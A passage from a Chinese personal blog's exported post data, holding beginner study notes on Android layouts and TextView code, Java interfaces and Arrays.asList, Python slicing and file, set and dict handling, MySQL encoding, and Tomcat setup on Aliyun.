int numberOfCoffee = Integer.parseInt(quantityTextView.getText().toString()); // display(numberOfCoffee); // displayPrice(numberOfCoffee * 5); String priceMessage = &quot;$ &quot;+(numberOfCoffee*5)+&quot;\\n&quot;+&quot;Thank you!&quot;; displayMessage(priceMessage); } public void increment(View view){ TextView quantityTextView = (TextView) findViewById(R.id.quantity_text_view); int quantity = Integer.parseInt(quantityTextView.getText().toString())+1; display(quantity); } public void decrement(View view){ TextView quantityTextView = (TextView)findViewById(R.id.quantity_text_view); int quantity = Integer.parseInt(quantityTextView.getText().toString())-1; display(quantity); } /** * This method displays the given quantity value on the screen. */ private void display(int number) { TextView quantityTextView = (TextView) findViewById(R.id.quantity_text_view); quantityTextView.setText(&quot;&quot; + number); } private void displayPrice(int number){ TextView priceTextView= (TextView) findViewById(R.id.price_text_view); priceTextView.setText(NumberFormat.getCurrencyInstance().format(number)); } /** * This method displays the given text on the screen. */ private void displayMessage(String message) { TextView priceTextView = (TextView) findViewById(R.id.price_text_view); priceTextView.setText(message); } }重点内容 Nested ViewGroups嵌套的视图组可以在LinearLayout中嵌套RelativeLayout2.按钮的onClick方法android:onClick=”submitOrder”，当然在MainActivity.java中要写这个方法，publicvoid submitOrder(View view){} TextView quantityTextView = (TextView)findViewById(R.id.quantity_text_view);int quantity = Integer.parseInt(quantityTextView.getText().toString())-1; quantityTextView.setText(“” + number);这个很重要，number是int类型，必须要转型，不然会一直报错，”” + number，或者scoreView.setText(String.valueOf(score)); priceTextView.setText(NumberFormat.getCurrencyInstance().format(number));只是将数字前面转型成字符，譬如10数字，转型成￥10 6. 题外话，如果要学习android，很推荐 https://cn.udacity.com/ 优达学城","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"贺卡应用","slug":"贺卡应用","date":"2017-09-08T01:39:19.000Z","updated":"2020-11-14T17:11:47.039Z","comments":true,"path":"2017/09/08/贺卡应用/","link":"","permalink":"http://yoursite.com/2017/09/08/%E8%B4%BA%E5%8D%A1%E5%BA%94%E7%94%A8/","excerpt":"","text":"&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:id=&quot;@+id/activity_main&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; tools:context=&quot;com.husky.happybirthday.MainActivity&quot;&gt; &lt;ImageView android:src=&quot;@drawable/party&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:scaleType=&quot;centerCrop&quot;/&gt; &lt;TextView android:text=&quot;Happy Birthday,Ben!&quot; android:fontFamily=&quot;sans-serif-light&quot; android:textColor=&quot;@android:color/white&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_alignParentLeft=&quot;true&quot; android:layout_alignParentTop=&quot;true&quot; android:paddingLeft=&quot;20dp&quot; android:paddingTop=&quot;20dp&quot; android:textSize=&quot;30sp&quot; /&gt; &lt;TextView android:text=&quot;From Adios&quot; android:fontFamily=&quot;sans-serif-light&quot; android:textColor=&quot;@android:color/white&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_alignParentBottom=&quot;true&quot; android:layout_alignParentRight=&quot;true&quot; android:paddingRight=&quot;20dp&quot; android:paddingBottom=&quot;20dp&quot; android:textSize=&quot;30sp&quot; /&gt; &lt;/RelativeLayout&gt;效果 定位，首先TextView中，使用android:layout_alignParentRight 先后顺序，应该是ImageView，TextView,TextView.这样可以不会将文字覆盖掉 padding android:scaleType=”centerCrop”(1)当图片大于ImageView的宽高：以图片的中心点和ImageView的中心点为基准，按比例缩小图片，直到图片的宽高有一边等于ImageView的宽高，则对于另一边，图片的长度大于或等于ImageView的长度，最后用ImageView的大小居中截取该图片。(2)当图片小于ImageView的宽高：以图片的中心店和ImageView的中心点为基准，按比例扩大图片，直到图片的宽高大于或等于ImageView的宽高，并按ImageView的大小居中截取该图片。","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"内边距和外边距","slug":"内边距和外边距","date":"2017-09-07T08:11:41.000Z","updated":"2020-11-14T17:11:48.378Z","comments":true,"path":"2017/09/07/内边距和外边距/","link":"","permalink":"http://yoursite.com/2017/09/07/%E5%86%85%E8%BE%B9%E8%B7%9D%E5%92%8C%E5%A4%96%E8%BE%B9%E8%B7%9D/","excerpt":"","text":"具体用法padding android:paddingLeft=&quot;16dp&quot; android:paddingRight=&quot;16dp&quot; 还有 android:padding=&quot;16dp&quot;margin android:layout_margin=&quot;16dp&quot; 或者 android:layout_marginBottom=&quot;16dp&quot;","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"RelativeLayout","slug":"RelativeLayout","date":"2017-09-07T08:03:15.000Z","updated":"2020-11-14T17:11:48.844Z","comments":true,"path":"2017/09/07/RelativeLayout/","link":"","permalink":"http://yoursite.com/2017/09/07/RelativeLayout/","excerpt":"","text":"基于父视图 android:layout_alignParentTop If &quot;true&quot;, makes the top edge of this view match the top edge of the parent. 这是居于顶部，如果是左上的话，android：layout_alignParentTop=&quot;true&quot; android:layout_alignParentLeft=&quot;true&quot; 其他的不写，默认是false android:layout_centerVertical If &quot;true&quot;, centers this child vertically within its parent.基于其他视图 android:layout_below Positions the top edge of this view below the view specified with a resource ID. android:layout_toRightOf Positions the left edge of this view to the right of the view specified with a resource ID.具体在 https://developer.android.com/reference/android/widget/RelativeLayout.LayoutParams.html 如果id是@+id/photo在下面引用时，是android:layout_toRightOf=”@id/photo”","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"LinearLayout","slug":"LinearLayout","date":"2017-09-06T11:58:23.000Z","updated":"2020-11-14T17:11:49.498Z","comments":true,"path":"2017/09/06/LinearLayout/","link":"","permalink":"http://yoursite.com/2017/09/06/LinearLayout/","excerpt":"","text":"LinearLayout:水平布局1.android:orientation Should the layout be a column or a row? Use “horizontal” for a row, “vertical”for a column. The default is horizontal.垂直布局还是水平布局 2.等间距布局水平等间距分别从左往右1.layout_width=”0dp”layout_height=”match_parent”layout_weight=”1”2.layout_width=”0dp”layout_height=”match_parent”layout_weight=”2”3.layout_width=”0dp”layout_height=”match_parent”layout_weight=”1” 首先确定是水平等距离还是垂直等距离，然后设置宽或高为0dp，然后设置layout_weight.layout_weight如果不设置，默认是0，是这个view的默认大小","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"ImageView","slug":"ImageView","date":"2017-09-06T08:57:10.000Z","updated":"2020-11-14T17:11:50.602Z","comments":true,"path":"2017/09/06/ImageView/","link":"","permalink":"http://yoursite.com/2017/09/06/ImageView/","excerpt":"","text":"&lt;ImageView android:src=&quot;@drawable/gakki&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:scaleType=&quot;centerCrop&quot; /&gt;首先在drawable里面导入图片，gakki.jpg然后调用时android:src=”@drawable/gakki”，不用加图片的拓展名这张图转载来自 http://blog.csdn.net/u012947056/article/details/46816153 使用scaleType=”centerCrop”时，是无边框，给人身临其境的感觉 google chrome搜索页面中信息时，windows ctr+Fmac cmd+ F &lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;TextView android:id=&quot;@+id/text_view_id&quot; android:layout_height=&quot;wrap_content&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;@string/hello&quot; /&gt; &lt;/LinearLayout&gt; public class MainActivity extends Activity { protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); final TextView helloTextView = (TextView) findViewById(R.id.text_view_id); helloTextView.setText(R.string.user_greeting); } This code sample demonstrates how to modify the contents of the text view defined in the previous XML layout:","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"android","slug":"android","permalink":"http://yoursite.com/tags/android/"}]},{"title":"android_TextView","slug":"android_TextView","date":"2017-09-06T07:46:04.000Z","updated":"2020-11-14T17:11:51.243Z","comments":true,"path":"2017/09/06/android_TextView/","link":"","permalink":"http://yoursite.com/2017/09/06/android_TextView/","excerpt":"","text":"XML:可拓展标记语言px ：是屏幕的像素点dp ：一个基于density的抽象单位，如果一个160dpi的屏幕，1dp=1pxdip ：等同于dpsp ：同dp相似，但还会根据用户的字体大小偏好来缩放(建议使用sp作为文本的单位，其它用dip) &lt;TextView &lt;/&gt; or &lt;TextView &gt; &lt;/TextView&gt;spandroid:textSize=”56sp”或者采用android：textAppearance=”?android:textAppearanceLarge” 还有android的颜色表 https://material.io/guidelines/style/color.html#color-color-system","categories":[],"tags":[{"name":"android学习笔记","slug":"android学习笔记","permalink":"http://yoursite.com/tags/android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"android日志","slug":"android日志","permalink":"http://yoursite.com/tags/android%E6%97%A5%E5%BF%97/"}]},{"title":"python写入mysql乱码","slug":"python写入mysql乱码","date":"2017-06-07T08:04:49.000Z","updated":"2020-11-14T17:11:51.756Z","comments":true,"path":"2017/06/07/python写入mysql乱码/","link":"","permalink":"http://yoursite.com/2017/06/07/python%E5%86%99%E5%85%A5mysql%E4%B9%B1%E7%A0%81/","excerpt":"","text":"mysql某人编码首先要保证mysql里面的默认编码是utf-8，可能是Latin1，所以你要改成utf-8，如果数据库文件不重要的话，就重装吧，安装的会提示默认编码，如果重要的话，你搜搜看，可能有修改方法 python连接数据库 db=MySQLdb.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;*******&apos;,&apos;databaseName&apos;,charset=&apos;utf8&apos;)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"公网访问阿里云tomcat","slug":"公网访问阿里云tomcat","date":"2017-05-30T08:22:15.000Z","updated":"2020-11-14T17:11:52.222Z","comments":true,"path":"2017/05/30/公网访问阿里云tomcat/","link":"","permalink":"http://yoursite.com/2017/05/30/%E5%85%AC%E7%BD%91%E8%AE%BF%E9%97%AE%E9%98%BF%E9%87%8C%E4%BA%91tomcat/","excerpt":"","text":"首先修改servlet.xmlport端口修改为80然后打开阿里云里面的网络和安全-》安全组-》配置规则-》添加安全组规则具体里面的协议类型：http80授权对象：0.0.0.0/0然后连接一下，应该可以成功","categories":[],"tags":[{"name":"tomcat","slug":"tomcat","permalink":"http://yoursite.com/tags/tomcat/"},{"name":"阿里云","slug":"阿里云","permalink":"http://yoursite.com/tags/%E9%98%BF%E9%87%8C%E4%BA%91/"}]},{"title":"linux tomcat具体安装","slug":"linux tomcat具体安装","date":"2017-05-29T08:32:17.000Z","updated":"2020-11-14T17:11:55.184Z","comments":true,"path":"2017/05/29/linux tomcat具体安装/","link":"","permalink":"http://yoursite.com/2017/05/29/linux%20tomcat%E5%85%B7%E4%BD%93%E5%AE%89%E8%A3%85/","excerpt":"","text":"安装 http://blog.csdn.net/carlos1992/article/details/43085897 使用： http://blog.csdn.net/liguu/article/details/41908529","categories":[],"tags":[{"name":"tomcat","slug":"tomcat","permalink":"http://yoursite.com/tags/tomcat/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"mysql 与 java","slug":"mysql 与 java","date":"2017-04-27T02:52:16.000Z","updated":"2020-11-14T17:11:55.719Z","comments":true,"path":"2017/04/27/mysql 与 java/","link":"","permalink":"http://yoursite.com/2017/04/27/mysql%20%E4%B8%8E%20java/","excerpt":"","text":"最近在windows下学习jdbc1.mysql下载 http://download.csdn.net/download/tan3739/8855049 不需要积分（0积分）安装的时候，一直next就行了。具体的自行百度 2.在cmd.exe运行mysql先配环境 http://jingyan.baidu.com/article/3ea51489e9998f52e61bbaf7.html 然后登陆，在终端登陆：mysql -h localhost -u root -p回车然后会提示输入密码（这个地方可能会报错，可能你的mysql没有启动的原因）3.基本操作 http://blog.csdn.net/duguduchong/article/details/8790719 几乎一样，先create database XXX，然后create table（）；4.与java交互 http://blog.csdn.net/haishu_zheng/article/details/50776439 http://blog.csdn.net/u013521637/article/details/48120955","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"jdbc","slug":"jdbc","permalink":"http://yoursite.com/tags/jdbc/"}]},{"title":"list切片(know how to slice sequences)","slug":"list切片(know how to slice sequences)","date":"2017-03-08T12:37:26.000Z","updated":"2020-11-14T17:11:56.220Z","comments":true,"path":"2017/03/08/list切片(know how to slice sequences)/","link":"","permalink":"http://yoursite.com/2017/03/08/list%E5%88%87%E7%89%87(know%20how%20to%20slice%20sequences)/","excerpt":"","text":"刚读了Effective Python a = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] print(&apos;first four: &apos;,a[:4])#[&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;] print(&apos;Last four: &apos;,a[-4:])#[&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] print(&apos;Middle two: &apos;,a[3:-3])#[&apos;d&apos;,&apos;e&apos;] assert a[:5] == a[0:5] assert a[5:] == a[5:len(a)] a[:20] # [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] a[-20:] # [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] a[20] # IndexError: list index out of range a = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;] a[2:7] = [99,22,14] print(a) #[&apos;a&apos;,&apos;b&apos;,99,22,14,&apos;h&apos;] b = a[:] assert b == a and b is not a b = a assert a is b # still the same list object avoid using start,end,and stride in a single slice[ start: end: stride] a = [&apos;red&apos;,&apos;orange&apos;,&apos;yellow&apos;,&apos;green&apos;,&apos;blue&apos;,&apos;purple&apos;] odds = a[::2] # [&apos;red&apos;,&apos;yellow&apos;,&apos;blue&apos;] evens = a[1::2] # [&apos;orange&apos;,&apos;green&apos;,&apos;purple&apos;] x = b&apos;mongoose&apos;# type(x) &lt;class &apos;bytes&apos;&gt;(in python3) y = x[::-1] print(y)# b&apos;esoognom&apos; #specifying start, end, and stride in a slice can be extremely confusing #prefer using positive stride values in slice widthout start or end indexs.Avoid negative stride values if possible","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"Arrays.asList()","slug":"Arrays.asList()","date":"2017-03-04T02:59:14.000Z","updated":"2020-11-14T17:11:56.729Z","comments":true,"path":"2017/03/04/Arrays.asList()/","link":"","permalink":"http://yoursite.com/2017/03/04/Arrays.asList()/","excerpt":"","text":"asList public static &lt;T&gt; List&lt;T&gt; asList(T... a) Returns a fixed-size list backed by the specified array. (Changes to the returned list &quot;write through&quot; to the array.) This method acts as bridge between array-based and collection-based APIs, in combination with Collection.toArray(). The returned list is serializable and implements RandomAccess. This method also provides a convenient way to create a fixed-size list initialized to contain several elements: List&lt;String&gt; stooges = Arrays.asList(&quot;Larry&quot;, &quot;Moe&quot;, &quot;Curly&quot;); Parameters: a - the array by which the list will be backed Returns: a list view of the specified array asList public static &lt;T&gt; List&lt;T&gt; asList(T... a) 返回一个受指定数组支持的固定大小的列表。（对返回列表的更改会“直接写”到数组。）此方法同 Collection.toArray() 一起，充当了基于数组的 API 与基于 collection 的 API 之间的桥梁。返回的列表是可序列化的，并且实现了 RandomAccess。 此方法还提供了一个创建固定长度的列表的便捷方法，该列表被初始化为包含多个元素： List&lt;String&gt; stooges = Arrays.asList(&quot;Larry&quot;, &quot;Moe&quot;, &quot;Curly&quot;); 参数： a - 支持列表的数组。 返回： 指定数组的列表视图。 import java.util.Arrays; import java.util.List; public class AddingGroups { public static void main(String[] args) { List&lt;Integer&gt; list = Arrays.asList(16,17,18); System.out.println(list); //list.add(11); underlying array cannot be resized } } import java.util.*; public class ModifyingArraysAsList { public static void main(String[] args) { Random rand = new Random(47); Integer[] ia = {1,2,3,4,5,6,7,8,9,10}; List&lt;Integer&gt; list1 = new ArrayList&lt;Integer&gt;(Arrays.asList(ia));//ArrayList(Collection &lt;? extends E&gt; c) System.out.println(&quot;Before shuffing: &quot; + list1); Collections.shuffle(list1,rand); System.out.println(&quot;After shuffling: &quot; + list1); System.out.println(&quot;array: &quot; + Arrays.toString(ia));//打印数组 List&lt;Integer&gt; list2 = Arrays.asList(ia); System.out.println(&quot;before shuffling : &quot; + list2); Collections.shuffle(list2,rand); System.out.println(&quot;After shuffing : &quot; + list2); System.out.println(&quot;array : &quot; + Arrays.toString(ia)); } } //Arrays.asList()产生的List的对象会使用底层数组作为其物理实现是很重要的，只要你执行的操作的修改这个List，并且你不想原来的数组被修改，那么你就应该在另一个容器中创建一个副本。Before shuffing: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]After shuffling: [4, 6, 3, 1, 8, 7, 2, 5, 10, 9]array: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]before shuffling : [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]After shuffing : [9, 1, 6, 3, 7, 2, 5, 10, 4, 8]array : [9, 1, 6, 3, 7, 2, 5, 10, 4, 8] import java.util.*; public class ArrayIsNotIterable { public static void main(String[] args) { Integer[] ia = {1,2,3,4,5,6,7,8,9}; List&lt;Integer&gt; list = Arrays.asList(ia); list.set(1, 0); for(Integer x : ia){ System.out.print(x + &quot;\\t&quot;); } System.out.println(); System.out.print(&quot;list : &quot; + list); } }1 0 3 4 5 6 7 8 9list : [1, 0, 3, 4, 5, 6, 7, 8, 9]","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"Python程序设计~数据处理学习","slug":"Python程序设计~数据处理学习","date":"2017-02-19T06:46:16.000Z","updated":"2020-11-14T17:11:57.211Z","comments":true,"path":"2017/02/19/Python程序设计~数据处理学习/","link":"","permalink":"http://yoursite.com/2017/02/19/Python%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1~%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"1.read file infile = open(fileName,&apos;r&apos;) #for line in infile:#遍历文件 listVar = [line.rstrip() for line in infile]将每一行生成列表 strVar = infile.read()#读取文件全部内容置于一个字符串 strVar = infile.readline()#读取当前指针指向的那一行，刚开始是置于文件第一行，执行语句后，将置于末尾。准备读取下一行 infile.close()#close file Test.txt文件中内容如下 Google Baidu Yahoo 其实是以下的方式 Google\\nBaidu\\nYahoo\\n2.create file outfile = open(fileName,&apos;w&apos;) outfile.write(strVar) outfile.writelines(strVar) #file.write(str)的参数是一个字符串，就是你要写入文件的内容. #file.writelines(sequence)的参数是序列，比如列表，它会迭代帮你写入文件. outfile.close()3.opened for append outfile = open(fileName,&apos;a&apos;)#打开文件在文件末尾添加 outfile.write(strVar) outfile.writelines(strVar) outfile.close()4.setlist列表是元素的顺序存储容器，而且允许元素重复set集合是元素的无序存储容器，不允许元素重复 {&quot;spam&quot;,&quot;ni&quot;},{3,4,7},{True,7,&quot;eleven&quot;},{&apos;a&apos;,&apos;b&apos;,(3,4)}#以上都是set #集合操作 word = {&quot;spam&quot;,&quot;ni&quot;} set.add()#word.add(&quot;eggs&quot;)#words = {&quot;spam&quot;,&quot;ni&quot;,&quot;eggs&quot;} set.discard()#discard丢弃，抛弃; 解雇; 出牌;word.discard(&quot;ni&quot;)words = {&quot;spam&quot;} set.clear()#words.clear() words = {} set#set([3,7,3])#{3,7} set#set((3,7,3))#{7,3} {x*x for x in range(-3,3)}#{0,1,4,9} set1.union(set2)#set1∪set2 set1.intersection(set2)#set1∩set2 set1.difference(set2)#set1-set2 File1.txt Alpha Bravo Charlie File2.txt Bravo Delta def main(): infile = open(&quot;File1.txt&quot;,&apos;r&apos;) firstSet = {line.rstrip() for line in infile} infile.close() infile = open(&quot;File2.txt&quot;,&apos;r&apos;) firstSet = {line.rstrip() for line in infile} infile.close() outfile = open(&quot;Union.txt&quot;,&apos;w&apos;) outfile.writelines(set1.union(set2)) outfile.close() outfile = open(&quot;Intersection.txt&quot;,&apos;w&apos;) outfile.writelines(set1.intersection(set2)) outfile.close() outfile = open(&quot;Difference.txt&quot;,&apos;w&apos;) outfile.writelines(set1.difference(set2)) outfile.close() main() Union.txt#Alpha,Bravo,Charlie,Delta Intersection.txt#Bravo Difference.txt#Alpha,Charlie5.csv文件将数据以逗号分隔（当然也可以不是逗号）譬如csvDemo.csvname,passwd,age,addresszhangsan,123456,15,sichuanglisi，45612,15，jiangshu可以在excel中打开 UN.txt Canada,North America,34.8,385500 France,Europe,66.3,211209 New Zealand,Austrlia/Oceania,4.4,103738 Nigeria,Africa,177.2,356669 Pakistan,Asia,196.2,310403 Peru,South America,30.1,496226 #----------------- def main(): continent = input(&quot;Enter the name of a continent:&quot;) continent = continent.title()#Allow for all lowercase letters if continent != &apos;Antarctica&apos;: infile = open(&quot;UN.txt&quot;,&apos;r&apos;) for line in infile: data = line.split(&apos;,&apos;) if data[1] == continent: print(data[0]) else: print(&quot;There are no counteries in Antarctica&quot;) #------- Enter the name of a continent:North America Canada6.dict字典 bob = {&quot;firstName&quot;:&quot;Robert&quot;,&quot;lastName&quot;:&quot;Smith&quot;,&quot;age&quot;:19} print(bob[&quot;firstName&quot;],bob[&quot;lastName&quot;],&quot;is&quot;,bob[&quot;age&quot;],&quot;years old.&quot;) [RUN] Robert Smith is 19 years old.dict操作 len(d)#字典中元素(键值对)的个数 x in d#如果x是字典的一个键，返回True x:y in d#如果x:y是字典中的元素，返回True#not in d[key1] = value1#返回key1对应的值，否者抛出异常 d.get(key1,default)#如果存在key1则返回value1，否者返回default list(d.keys())#返回字典键组成的list list(d.values())#返回字典值组成的list list(d.items())#返回(key,value)形成的二元组组成的列表，其中d[key]=value list(d)#set(d)#tuple(d)#返回字典的键组成的列表，集合，元组 c = {}#创建一个字典 c = dict(d)#创建字典d的一个拷贝 d.update(c)#将字典c所有的元素合并入字典d。如果两个元素拥有相同的键，则使用c中的值替换d中的值实例 eg 1: def translate(color):#英语翻译成意大利语 if color == &quot;red&quot;: return &quot;rojo&quot; elif color == &quot;blue&quot;: return &quot;aloz&quot; elif color == &quot;green&quot;: return &quot;verdi&quot; elif color == &quot;white&quot;: return &quot;blanco&quot; #----- translate = {&quot;red&quot;:&quot;rojo&quot;,&quot;blue&quot;:&quot;aloz&quot;,&quot;green&quot;:&quot;verdi&quot;,&quot;white&quot;:&quot;blanco&quot;} eg 2: list1 = [[&quot;one&quot;,1],[&quot;two&quot;,2],[&quot;three&quot;,3]] 或list1 = [(&quot;one&quot;,1),(&quot;two&quot;,2),(&quot;three&quot;,3)] dict(list1) {&quot;one&quot;:1,&quot;two&quot;:2,&quot;three&quot;:3} eg 3: Textese.txt anyone,nei are,r ate,8 band,b&amp; be,b #----- def main(): texteseDict = createDictionary(&quot;Textese.txt&quot;) print(&quot;Enter a simple sentence in lowercase letters without&quot;) sentence = input(&quot;any punctuation: &quot;) print() translate(sentence,texteseDict) def createDictionary(fileName): infile = open(fileName,&apos;r&apos;) textList = [line.rstrip() for line in infile] infile.close() return dict([var.split(&apos;,&apos;) for var in textList]) def translate(sentence,texteseDict): words = sentence.split() for word in words: print(texteseDict.get(word,word)+&quot; &quot;,end = &quot; &quot;) main() 耗时2h写好","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"数据","slug":"数据","permalink":"http://yoursite.com/tags/%E6%95%B0%E6%8D%AE/"}]},{"title":"pycharm中修改python版本","slug":"pycharm中修改python版本","date":"2017-01-05T08:22:47.000Z","updated":"2020-11-14T17:11:57.741Z","comments":true,"path":"2017/01/05/pycharm中修改python版本/","link":"","permalink":"http://yoursite.com/2017/01/05/pycharm%E4%B8%AD%E4%BF%AE%E6%94%B9python%E7%89%88%E6%9C%AC/","excerpt":"","text":"File-&gt;Settings-&gt;project:XXX-&gt;Project Interpreter may be you can happy more","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"hover","slug":"hover","date":"2016-12-18T12:26:58.000Z","updated":"2020-11-14T17:11:58.204Z","comments":true,"path":"2016/12/18/hover/","link":"","permalink":"http://yoursite.com/2016/12/18/hover/","excerpt":"","text":"当鼠标移动到元素上时，变变颜色什么的，可以用hover，hover可以和任何元素搭配，只是通常和a:hover，但是刚刚用到了ul li:hover{ #left ul li{border-bottom:1px solid #999; background-image:url(images/bullet-green.gif); background-repeat:no-repeat;width:150px; margin-left:0px; text-align:center; } #left a{color:black; font-weight: bold;} #left ul li:hover{background-image: url(images/bullet-red.gif);background-repeat: no-repeat;}","categories":[],"tags":[{"name":"css","slug":"css","permalink":"http://yoursite.com/tags/css/"}]},{"title":"ubuntu下配置","slug":"ubuntu下配置","date":"2016-11-28T02:50:14.000Z","updated":"2020-11-14T17:11:58.684Z","comments":true,"path":"2016/11/28/ubuntu下配置/","link":"","permalink":"http://yoursite.com/2016/11/28/ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AE/","excerpt":"","text":"Chrome Android Studio Eclipse Sublime Text WebStorm jetBrains注册码 PyCharm CLion 网易云音乐 Unity Tweak Tool 主题Numix Numix daily Flatabulous 图标numix-circle-light IDLE KchmViewer 看chm文件 12.","categories":[],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"http://yoursite.com/tags/ubuntu/"}]},{"title":"java接口interface","slug":"java接口interface","date":"2016-11-23T09:33:52.000Z","updated":"2020-11-14T17:11:59.168Z","comments":true,"path":"2016/11/23/java接口interface/","link":"","permalink":"http://yoursite.com/2016/11/23/java%E6%8E%A5%E5%8F%A3interface/","excerpt":"","text":"代码 package Interface; public class InterfaceDemo { public static void main(String[] args) { //System.out.println(IAbility.number); //System.out.println(IAbility.number++); //The final field IAbility.number cannot be assigned赋值 Person person=new Person(); IAbility iability1=new Child(); IAbility iability2=new Dog(); person.feed(iability1); person.feed(iability2); if(iability1 instanceof Child){ Child children = (Child)iability1; children.hhh(); } Dog dog = new Dog(); Child child = new Child(); person.feed(dog); person.feed(child); } } class Person{ /* public void feed(Child child){ child.eat(); } public void feed(Dog dog){ dog.eat(); }*/ //interface public void feed(IAbility ability){ ability.eat();//dongtai bangding } } interface IAbility{ //public static final int number = 1;//int number = 1;default number is public static final /*public abstract*//* void show();*///void show();default is public abstract public abstract void eat(); } class Child implements IAbility{ @Override public void eat(){ System.out.println(&quot;eat rice&quot;); } public void hhh(){ System.out.println(&quot;nihao&quot;); } } class Dog implements IAbility{ @Override public void eat(){ System.out.println(&quot;eat bone&quot;); } } interface Action{ int number = 1;//public static final int number = 1; /*两个意思是一样的*/ public void eat();/*public abstract void eat();*/ } /*为什么用到interface,因为child和dog类并没有特定的父类,而他们的方法可以通过接口实现*/ 1. 子类在选择抽象类还是接口,是抽象类是一种is-a,而接口是like-a2. _子类可以有 多个 接口(extends),但只有一个父类(普通类或抽象类)(implements) _ 以下 是来自一个大佬的对abstract class和interface深入理解[ 大佬的理解 ](https://www.ibm.com/developerworks/cn/java/l-javainterface-abstract/) /*目的:安全门*/ 1. abstract class Door { abstract void open(); abstract void close()； abstract void alarm(); } class AlarmDoor extends Door { void open() { … } void close() { … } void alarm() { … } } 2.interface Door { void open(); void close(); void alarm(); } class AlarmDoor implements Door ｛ void open() { … } void close() { … } void alarm() { … } ｝ 这种方法违反了面向对象设计中的一个核心原则ISP（Interface Segregation Priciple），在Door的定义中把Door概念本身固有的行为方法和另外一个概念&quot;报警器&quot;的行为方法混在了一起。这样引起的一个问题是那些仅仅依赖于Door这个概念的模块会因为&quot;报警器&quot;这个概念的改变（比如：修改alarm方法的参数）而改变，反之依然。 //--------------------------------------------------------- //以下是正确的 /*既然open、close和alarm属于两个不同的概念，根据ISP原则应该把它们分别定义在代表这两个概念的抽象类中。定义方式有：这两个概念都使用abstract class方式定义；两个概念都使用interface方式定义；一个概念使用abstract class方式定义，另一个概念使用interface方式定义。 显然，由于Java语言不支持多重继承，所以两个概念都使用abstract class方式定义是不可行的。后面两种方式都是可行的，但是对于它们的选择却反映出对于问题领域中的概念本质的理解、对于设计意图的反映是否正确、合理。我们一一来分析、说明。 